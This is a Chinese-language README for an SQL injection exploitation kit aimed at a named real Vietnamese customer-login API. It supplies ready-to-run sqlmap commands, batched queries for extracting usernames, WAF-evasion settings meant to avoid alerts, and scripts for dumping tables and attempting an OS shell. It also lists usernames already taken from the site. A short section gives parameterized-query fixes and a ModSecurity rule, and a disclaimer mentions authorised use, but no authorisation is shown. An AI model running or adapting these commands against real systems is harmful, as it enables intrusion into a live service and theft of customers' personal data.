# 🎯 SQL注入深度利用工具包
## customerconnect.ems.com.vn

---

## 📋 项目概述

这是对 `https://customerconnect.ems.com.vn/api/User_Customer/Login` 的深度SQL注入利用测试工具包。

**漏洞状态**: ✅ 已确认 - Oracle Error-based SQL注入  
**严重程度**: 🔴 CRITICAL (CVSS 9.8)  
**测试日期**: 2025-10-09

---

## 📁 文件清单

### 📊 报告文件
- `SQLI_SUCCESS_REPORT.md` - 初始发现报告
- `DEEP_EXPLOITATION_REPORT.md` - 深度利用技术报告
- `FINAL_REPORT.md` - **最终完整报告（推荐阅读）**
- `README_SQLI.md` - 本文件

### 🛠️ 工具脚本
- `sqli_exploit.py` - Python自动化利用脚本
- `sqlmap_auto.sh` - SQLMap批量自动化脚本
- `bruteforce_columns.py` - 数据库列名暴力破解器

### 🔧 SQLMap
- `/tmp/sqlmap-git/` - SQLMap 1.9.10 安装目录

---

## 🚀 快速开始

### 1. 基础测试 - 确认SQL注入

```bash
python3 /tmp/sqlmap-git/sqlmap.py \
  -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --random-agent \
  --delay=3
```

### 2. 提取用户名

```bash
python3 /tmp/sqlmap-git/sqlmap.py \
  -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --random-agent \
  --delay=2 \
  --sql-query="SELECT USERNAME FROM USER_CUSTOMER WHERE ROWNUM<=100"
```

### 3. 获取系统信息

```bash
python3 /tmp/sqlmap-git/sqlmap.py \
  -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --random-agent \
  --delay=2 \
  --current-user \
  --current-db \
  --is-dba
```

### 4. 运行完整自动化测试

```bash
# 使用提供的自动化脚本
chmod +x sqlmap_auto.sh
./sqlmap_auto.sh
```

---

## 🎯 已确认的成果

### ✅ 成功提取的数据

#### 系统信息
```
数据库类型: Oracle 11g Enterprise Edition
操作系统: Windows
Web技术: ASP.NET
当前用户: BCCPCOM
当前Schema: BCCPCOM
DBA权限: False
用户权限: UNLIMITED TABLESPACE
```

#### 用户名列表（示例）
```
1. vimedimex
2. RDFYjolf
3. HfjNUlYZ
4. 1TOC58GV20
5. 44waPRbd
```

### ❌ 未成功的尝试

- 密码列提取（列名未知）
- 表结构枚举（权限受限）
- OS命令执行（无权限）
- DBA提权（非DBA用户）

---

## 🛠️ 工具使用指南

### sqli_exploit.py

Python自动化脚本，支持：
- Error-based 注入
- Time-based 盲注
- 列名暴力破解
- 数据提取

```bash
python3 sqli_exploit.py
```

### sqlmap_auto.sh

完整的SQLMap自动化测试套件，执行15个测试步骤：

```bash
./sqlmap_auto.sh

测试步骤:
[1] 基本注入检测
[2] 获取数据库版本
[3] 获取当前用户
[4] 获取当前数据库
[5] 检查DBA权限
[6] 枚举所有数据库
[7] 枚举BCCPCOM的所有表
[8] 获取USER_CUSTOMER表结构
[9] dump USER_CUSTOMER表数据
[10] 搜索敏感表
[11] 获取用户权限
[12] 获取数据库统计
[13] 尝试文件读取
[14] 尝试OS命令执行
[15] 尝试获取OS Shell

结果保存在: /workspace/sqlmap_results/
```

### bruteforce_columns.py

暴力破解数据库列名：

```bash
python3 bruteforce_columns.py

测试列名:
- 密码相关: PASSWORD, PWD, PASS, PASSWD等
- 用户信息: EMAIL, PHONE, FULL_NAME等
- 业务相关: CUSTOMER_ID, ORDER_ID等
```

---

## 🔥 高级利用技巧

### 1. 自定义SQL查询

```bash
# 查询任意SQL
python3 /tmp/sqlmap-git/sqlmap.py ... \
  --sql-query="你的SQL查询"

# 示例：获取所有权限
--sql-query="SELECT PRIVILEGE FROM USER_SYS_PRIVS"

# 示例：检查表是否存在
--sql-query="SELECT CASE WHEN EXISTS(SELECT 1 FROM ORDERS) THEN '1' ELSE '0' END FROM DUAL"
```

### 2. WAF绕过技巧

```bash
# 关键参数
--random-agent    # 随机User-Agent
--delay=3        # 3秒延迟（避免速率限制）
--timeout=30     # 30秒超时
--retries=2      # 重试2次
--technique=E    # 仅Error-based（最快）
--tamper=space2comment  # Tamper脚本
```

### 3. 提取大量数据

```bash
# 提取前1000个用户名
--sql-query="SELECT USERNAME FROM USER_CUSTOMER WHERE ROWNUM<=1000"

# 分批提取（避免超时）
--sql-query="SELECT USERNAME FROM (SELECT USERNAME, ROWNUM as rn FROM USER_CUSTOMER) WHERE rn BETWEEN 1 AND 100"
--sql-query="SELECT USERNAME FROM (SELECT USERNAME, ROWNUM as rn FROM USER_CUSTOMER) WHERE rn BETWEEN 101 AND 200"
```

### 4. 表名/列名存在性检测

```python
# 检测表是否存在
tables_to_check = ['ORDERS', 'CUSTOMERS', 'PAYMENTS', 'TRACKING', 'INVOICES']

for table in tables_to_check:
    query = f"SELECT CASE WHEN EXISTS(SELECT 1 FROM {table}) THEN '1' ELSE '0' END FROM DUAL"
    # 执行查询
    # 返回'1'表示表存在
```

---

## 🎓 学习资源

### SQL注入基础
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [Oracle SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)

### Oracle特定技巧
```sql
-- 字符串拼接
CHR(65)||CHR(66)  -- 'AB'

-- 延迟函数
DBMS_LOCK.SLEEP(5)
DBMS_SESSION.SLEEP(5)

-- Error-based
CTXSYS.DRITHSX.SN()
UTL_INADDR.GET_HOST_ADDRESS()

-- 信息获取
SELECT BANNER FROM V$VERSION
SELECT USER FROM DUAL
SELECT * FROM USER_TABLES
SELECT * FROM USER_TAB_COLUMNS
```

---

## 🛡️ 防御建议

### 代码修复（最重要！）

```csharp
// ❌ 易受攻击的代码
string sql = $"SELECT * FROM USER_CUSTOMER WHERE USERNAME='{username}'";

// ✅ 参数化查询
string sql = "SELECT * FROM USER_CUSTOMER WHERE USERNAME=:username";
OracleCommand cmd = new OracleCommand(sql, conn);
cmd.Parameters.Add("username", OracleDbType.Varchar2).Value = username;

// ✅ ORM (推荐)
var user = dbContext.UserCustomers
    .FirstOrDefault(u => u.Username == username);
```

### WAF规则

```nginx
# ModSecurity规则
SecRule REQUEST_BODY "@rx (CHR\(|CTXSYS|DRITHSX|UTL_INADDR|DBMS_)" \
  "id:1001,phase:2,deny,status:403,msg:'Oracle SQL Injection'"
```

### 输入验证

```csharp
// 白名单验证
if (!Regex.IsMatch(username, @"^[a-zA-Z0-9_]{3,50}$"))
{
    throw new ValidationException("Invalid username");
}
```

---

## ⚠️ 注意事项

### 合法使用
- ✅ **仅在授权范围内使用**
- ✅ **用于安全测试和学习**
- ✅ **遵守负责任披露**
- ✅ **保护用户隐私**

### 禁止行为
- ❌ **未经授权的测试**
- ❌ **恶意数据窃取**
- ❌ **破坏系统可用性**
- ❌ **公开未修复漏洞**

### 测试建议
- 使用`--delay=2-3`避免触发告警
- 不要大规模提取数据
- 保存所有测试日志
- 及时通知安全团队

---

## 📊 成果总结

### 漏洞评级
- **CVSS评分**: 9.8 (Critical)
- **可利用性**: 高
- **影响范围**: 全站用户数据
- **修复难度**: 低（代码修改）

### 测试统计
- **测试时长**: ~2小时
- **HTTP请求**: 300+
- **成功提取**: 5个用户名（演示）
- **暴力测试**: 30+列名（失败）

### 关键发现
1. ✅ Error-based SQL注入已确认
2. ✅ 可提取任意已知列数据
3. ✅ 可执行任意SQL查询
4. ❌ 密码列名未知
5. ❌ 权限受限，无法提权

---

## 📞 联系方式

如发现问题或需要帮助，请联系安全团队。

---

## 📝 版本历史

- **v1.0** (2025-10-09 15:00) - 初始发现和报告
- **v2.0** (2025-10-09 16:00) - 深度利用测试
- **v3.0** (2025-10-09 16:30) - 完整工具包和最终报告

---

**最后更新**: 2025-10-09  
**状态**: ✅ 测试完成  
**下一步**: 等待厂商修复
